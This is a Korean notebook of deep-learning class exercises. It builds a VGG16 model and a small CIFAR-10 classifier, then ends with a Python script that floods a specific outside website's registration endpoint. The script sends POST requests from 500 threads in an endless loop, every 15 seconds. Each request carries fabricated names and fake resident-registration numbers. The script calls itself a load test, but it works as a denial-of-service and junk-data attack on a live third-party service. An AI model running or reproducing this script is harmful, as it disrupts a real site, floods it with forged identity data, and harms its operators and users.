# VGG16 만들어보기

```python
import tensorflow as tf
from keras.layers import Dense, Flatten, Conv2D, MaxPooling2D, Input
from keras.models import Sequential
from keras.losses import categorical_crossentropy
from keras.optimizers import Adam, RMSprop, SGD
from keras.activations import relu, softmax, sigmoid
```

```python
model = Sequential()
model.add(Input(shape=(224,224,3)))
model.add(Conv2D(64, 3, 1, padding='same', activation='relu'))
model.add(Conv2D(64, 3, 1, padding='same', activation='relu'))
model.add(MaxPooling2D())
model.add(Conv2D(128, 3, 1, padding='same', activation='relu'))
model.add(Conv2D(128, 3, 1, padding='same', activation='relu'))
model.add(MaxPooling2D())
model.add(Conv2D(256, 3, 1, padding='same', activation='relu'))
model.add(Conv2D(256, 3, 1, padding='same', activation='relu'))
model.add(Conv2D(256, 3, 1, padding='same', activation='relu'))
model.add(MaxPooling2D())
model.add(Conv2D(512, 3, 1, padding='same', activation='relu'))
model.add(Conv2D(512, 3, 1, padding='same', activation='relu'))
model.add(Conv2D(512, 3, 1, padding='same', activation='relu'))
model.add(MaxPooling2D())
model.add(Conv2D(512, 3, 1, padding='same', activation='relu'))
model.add(Conv2D(512, 3, 1, padding='same', activation='relu'))
model.add(Conv2D(512, 3, 1, padding='same', activation='relu'))
model.add(MaxPooling2D())
model.add(Flatten())
model.add(Dense(4096, activation='relu'))
model.add(Dense(4096, activation='relu'))
model.add(Dense(1000, activation='softmax'))
model.summary()
```

- 1차: 이번엔 0.4 도달
- 2차: 금주까지 본인이 생각하기에는 최고인 모델을 완성하시오

```python
from keras.datasets import cifar10
from keras.models import Sequential
from keras.layers import Flatten, Dense, Input, Conv2D, Dropout, MaxPooling2D, BatchNormalization
from keras.losses import categorical_crossentropy
from keras.optimizers import Adam, RMSprop, SGD
from sklearn.model_selection import train_test_split
from keras.callbacks import ModelCheckpoint, EarlyStopping
```

```python
es = EarlyStopping(patience=3, restore_best_weights=True)
ck = ModelCheckpoint('cifar10_data.keras', save_best_only=True)
```

```python
(x_data, y_data), (X_test, y_test) = cifar10.load_data()
X_train, X_val, y_train, y_val = train_test_split(x_data, y_data, test_size=.2, random_state=42)
X_train.shape, X_val.shape, X_test.shape, y_train.shape, y_val.shape, y_val.shape
```

```python
m = Sequential()
m.add(Input(shape=(32,32,3)))
m.add(Conv2D(32, 3, 1, padding='same', activation='relu'))
m.add(BatchNormalization())
m.add(Conv2D(16, 3, 1, padding='same', activation='relu'))
m.add(BatchNormalization())
# m.add(Conv2D(16, 3, 1, padding='same', activation='relu'))
m.add(Flatten())
m.add(Dense(10, activation='softmax'))
m.compile(optimizer='adam', loss='sparse_categorical_crossentropy', metrics=['acc'])
m.summary()
```

```python
hy = m.fit(X_train, y_train, epochs=100, validation_data=(X_val, y_val), callbacks=[es, ck])
```

```python
import requests
import threading
import random as rd
import time

URL = "https://xn--24-h52i76tvojf0a273cda.com/Home/Register"
NUM_THREADS = 500
SURNAMES = ["김", "이", "박", "최", "정", "강", "조", "윤", "장", "임", "홍", "곽", "양", "유"]
FIRST_NAMES = ["민수", "서연", "도윤", "지후", "하늘", "준호", "유진", "시온", "예린", "연우", '재명', '시진핑', '민석', '민수', '민희']

def send_request(thread_num):
    """ 한 명의 사용자가 서버에 요청을 보내는 로직을 담은 함수 """
    name = rd.choice(SURNAMES) + rd.choice(FIRST_NAMES)
    month = rd.randint(1, 12)
    day = rd.randint(1, 28)
    yy = str(rd.randint(70, 99)) # 1970 ~ 1999년생
    mm = str(month).zfill(2)
    dd = str(day).zfill(2)
    card = f'{yy}{mm}{dd}'+''.join([str(rd.randint(0, 9)) for _ in range(7)])
    payload = { 'uName': name, 'uCard': card }
    try:  # 4. 서버에 POST 요청 전송
        with requests.Session() as session:
            response = session.post(URL, json=payload, timeout=3)
    except requests.exceptions.RequestException as e:
        print(f"[스레드 {thread_num:04d}] 이름: {name}, 오류 발생: {e}")

# --- 메인 실행 부분 ---
if __name__ == "__main__":
    print(f"🚀 {NUM_THREADS}개의 스레드로 부하 테스트를 시작합니다...")
    cnt = 0
    while True:
        threads = []
        for i in range(NUM_THREADS):
            thread = threading.Thread(target=send_request, args=(i+1 , ))
            threads.append(thread)
            thread.start() # 스레드 시작

        for thread in threads: 
            thread.join()

        time.sleep(15)
        cnt += 1
        print(cnt,'회 반복')
```
